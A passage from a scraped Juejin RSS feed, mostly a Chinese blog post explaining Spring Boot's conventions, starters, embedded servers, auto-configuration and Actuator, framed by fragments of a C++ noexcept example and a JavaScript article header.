    <span class="hljs-comment">// ...</span>
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> b)</span> <span class="hljs-title">noexcept</span><span class="hljs-params">(<span class="hljs-literal">false</span>)</span>   <span class="hljs-comment">// 允许抛异常（可省略不写）</span>
</span>{
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<blockquote>
<p>注：旧式 <code>throw(type-list)</code> 规格已在 C++11 起被<strong>废弃</strong>，现代代码应使用 <code>noexcept</code>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 不只是自动装配：让你专注业务，而不是配置]]></title>    <link>https://juejin.cn/post/7581870491755495459</link>    <guid>https://juejin.cn/post/7581870491755495459</guid>    <pubDate>2025-12-09T16:22:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491755495459" data-draft-id="7581688255625838644" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 不只是自动装配：让你专注业务，而不是配置"/> <meta itemprop="keywords" content="后端,Java,Spring Boot"/> <meta itemprop="datePublished" content="2025-12-09T16:22:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="最贪吃的虎"/> <meta itemprop="url" content="https://juejin.cn/user/1109832819826707"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 不只是自动装配：让你专注业务，而不是配置
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1109832819826707/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    最贪吃的虎
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T16:22:03.000Z" title="Tue Dec 09 2025 16:22:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><blockquote>
<p>我们总在寻找捷径。</p>
<p>从前写程序，像推一辆没轮子的车，走三步，停两步，不是缺个螺丝，就是少根轴。配文件比写业务还长，引依赖像在雷区里走路，一不小心就炸了版本。</p>
<p>后来来了个叫 Spring Boot 的家伙。</p>
</blockquote>
<h2 data-id="heading-0">—— 从“会用”到“真懂”的一次彻底梳理</h2>
<p>你是不是也这样？</p>
<ul>
<li>
<p>能用 Spring Boot 快速搭个 REST API；</p>
</li>
<li>
<p>知道它有“自动装配”、“起步依赖”、“内嵌 Tomcat”；</p>
</li>
<li>
<p>但当别人问：“Spring Boot 到底强在哪儿？”</p>
<p>我..好像从没有仔细想过，但是我很喜欢一句话，它能够给出合理解释：<strong>约定大于配置</strong>，你只需要聚焦业务的处理，而不用关心使用的是什么工具，因为我会为你提供默认的，就像我需要切菜，使用水果刀、菜刀、剪刀...不同颜色种类，因为大部分人都会使用菜刀，所以默认给你的就是菜刀，如果你想要试试剪刀，只需要更改配置，而不是更改代码。</p>
</li>
</ul>
<p>今天，我们就抛开术语堆砌，从<strong>真实开发场景出发</strong>，彻底搞清楚：<strong>Spring Boot 为什么能成为现代 Java 开发的事实标准？</strong></p>
<hr/>
<h2 data-id="heading-1">一、它不是新框架，而是“最佳实践的集成包”</h2>
<p>很多人误以为 Spring Boot 是 Spring 的替代品。其实恰恰相反——<br/>
<strong>它是 Spring 的“开发者体验优化版”</strong>。</p>
<p>过去用 Spring MVC + MyBatis + Tomcat，你要：</p>
<ul>
<li>配 <code>web.xml</code></li>
<li>写数据源配置</li>
<li>引一堆版本可能冲突的 jar 包</li>
<li>手动部署 WAR 到外部服务器</li>
</ul>
<p>而 <strong>Spring Boot</strong>的出现，告诉你：“你只需要关心业务的逻辑，配置就让我来吧”。</p>
<hr/>
<h2 data-id="heading-2">二、五大核心机制：让开发“少写、少配、少错”</h2>
<h3 data-id="heading-3">1. <strong>约定大于配置（Convention over Configuration）</strong></h3>
<blockquote>
<p>“如果你不特别说明，我就按最合理的方式办。”</p>
</blockquote>
<ul>
<li>主类放 <code>src/main/java</code>？→ 自动扫描同包及子包的组件。</li>
<li>配置文件叫 <code>application.yml</code>？→ 自动加载。</li>
<li>用了 <code>@RestController</code>？→ 自动注册为 Web 接口。</li>
</ul>
<p><strong>结果</strong>：90% 的常规项目，零配置就能跑起来。</p>
<blockquote>
<p><strong>深层价值</strong>：省下的不是几行代码，而是决策成本和认知负担。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">2. <strong>起步依赖（Starter Dependencies）</strong></h3>
<p>还记得以前为了整合 Redis，要查半天该引哪些包吗？</p>
<p>现在只需一行：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>这个 starter 已经包含了：</p>
<ul>
<li>Lettuce 客户端</li>
<li>Spring Data Redis 支持</li>
<li>连接池配置</li>
<li>自动序列化器</li>
</ul>
<p><strong>背后是 Spring 团队帮你做了依赖版本对齐和组合测试，告别“依赖地狱”，技术栈开箱即用。</strong></p>
<hr/>
<h3 data-id="heading-5">3. <strong>内嵌服务器</strong></h3>
<p>传统 Java Web：WAR → 外部 Tomcat → 启动慢、环境不一致。</p>
<p>Spring Boot：<strong>JAR = 应用 + 服务器</strong>。</p>
<pre><code class="hljs language-bash" lang="bash">java -jar myapp.jar
</code></pre>
<p>服务秒级启动，且自带 Tomcat / Jetty / Undertow（可切换），开发调试快如闪电，Docker 部署一行搞定，真正实现“一次构建，随处运行”。</p>
<hr/>
<h3 data-id="heading-6">4. <strong>自动装配（Auto-configuration）</strong></h3>
<p>这是 Spring Boot 的“魔法心脏”。</p>
<p>当你引入 <code>spring-boot-starter-jdbc</code> 并配置了数据库 URL，<br/>
Spring Boot 会<strong>自动</strong>：</p>
<ul>
<li>创建 <code>DataSource</code></li>
<li>配置事务管理器</li>
<li>注册 JdbcTemplate</li>
</ul>
<p>这一切基于 <strong>条件装配（Conditional）</strong>：</p>
<ul>
<li>如果 classpath 有 HikariCP → 用它做连接池</li>
<li>如果你没自定义 DataSource → 我来创建</li>
<li>如果你写了 <code>@EnableTransactionManagement</code> → 就不再重复注册</li>
</ul>
<blockquote>
<p>智能推断你的意图，只在必要时让你介入。</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">5. <strong>自定义 Starter：把团队能力产品化</strong></h3>
<p>想象一下：公司有统一的日志规范、认证 SDK、监控埋点。</p>
<p>你可以封装成 <code>company-spring-boot-starter-xxx</code>，其他项目只需引入：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.yourcompany<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>company-spring-boot-starter-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>然后——日志格式自动统一、TraceID 自动注入、错误上报自动开启。</p>
<blockquote>
<p>想象一下：新人上手零成本，架构治理落地到每一行代码。</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">三、被低估的“隐藏优势”：不止于开发阶段</h2>
<p>Spring Boot 的厉害，还体现在<strong>全生命周期支持</strong>：</p>
<h3 data-id="heading-9">🔹 <strong>统一配置管理</strong></h3>
<ul>
<li><code>application-{profile}.yml</code> 按环境隔离</li>
<li><code>@ConfigurationProperties</code> 类型安全绑定</li>
<li>支持命令行、环境变量、Config Server 多种来源</li>
</ul>
<h3 data-id="heading-10">🔹 <strong>Actuator：生产级监控开箱即用</strong></h3>
<ul>
<li><code>/health</code>：服务是否健康？</li>
<li><code>/metrics</code>：QPS、内存、GC 情况？</li>
<li><code>/loggers</code>：线上动态调日志级别（不用重启！）</li>
</ul>
<p>配合 Prometheus + Grafana，运维从此有“眼睛”。</p>
<h3 data-id="heading-11">🔹 <strong>DevTools：开发效率倍增器</strong></h3>
<ul>
<li>代码修改 → 自动重启（秒级）</li>
<li>模板文件修改 → 实时刷新</li>
<li>禁用缓存 + 详细错误页</li>
</ul>
<p>告别“改一行 → 重启 30 秒”的痛苦循环。</p>
<h3 data-id="heading-12">🔹 <strong>测试超级友好</strong></h3>
<ul>
<li><code>@WebMvcTest</code>：只测 Controller</li>
<li><code>@DataJpaTest</code>：只测 Repository（自动回滚）</li>
<li>内置 MockMvc、TestRestTemplate、JsonPath</li>
</ul>
<h3 data-id="heading-13">🔹 <strong>与 Spring 生态无缝融合</strong></h3>
<p>Security、Cloud、Batch、Kafka……<br/>
只要加个 starter，<strong>默认配置已为你调优</strong>，无需研究如何“拼装”。</p>
<h3 data-id="heading-14">🔹 <strong>构建 &amp; 部署现代化</strong></h3>
<ul>
<li>Maven/Gradle 插件一键打包可执行 JAR</li>
<li>支持分层 JAR（Layered JAR），优化 Docker 构建缓存</li>
<li><code>./mvnw spring-boot:build-image</code> 直接生成 OCI 镜像！</li>
</ul>
<hr/>
<h2 data-id="heading-15">结语：</h2>
<h4 data-id="heading-16">它解决的不是“技术问题”，而是<strong>开发者的痛点</strong>：</h4>
<p>不用纠结配置的选择，可插拔设计不再重复造轮子，团队代码规范，运维成本更低...等等，并且 <strong>它不强迫你理解所有细节，但永远给你深入的自由。</strong></p>
<ul>
<li>你可以只写 Controller，享受“开箱即用”；</li>
<li>也可以通过 <code>@Configuration</code>、<code>EnvironmentPostProcessor</code>、<code>BeanFactoryPostProcessor</code> 深度定制；</li>
<li>甚至可以基于它构建自己的框架（比如国内很多中台 PaaS）。</li>
</ul>
<p>这种“<strong>简单而不简陋，强大而不复杂</strong>”的设计，才是 Spring Boot 十年不衰的真正原因。</p>
<hr/>
<h2 data-id="heading-17">写在最后</h2>
<p>“Spring Boot 好在哪？”</p>
<p><strong>// 写给每一个每天和 <code>@SpringBootApplication</code> 打交道，却总觉得“好像还差点什么”的 Java 开发者。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 中为何未定义变量在 typeof 与 delete 中不会报错？——原理、示例与最佳实践]]></title>    <link>https://juejin.cn/post/7581727073581383731</link>    <guid>https://juejin.cn/post/7581727073581383731</guid>    <pubDate>2025-12-10T01:54:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073581383731" data-draft-id="7581691182004584458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 中为何未定义变量在 typeof 与 delete 中不会报错？——原理、示例与最佳实践"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T01:54:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="excel"/> <meta itemprop="url" content="https://juejin.cn/user/2911162520062862"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 中为何未定义变量在 typeof 与 delete 中不会报错？——原理、示例与最佳实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2911162520062862/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    excel
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:54:45.000Z" title="Wed Dec 10 2025 01:54:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
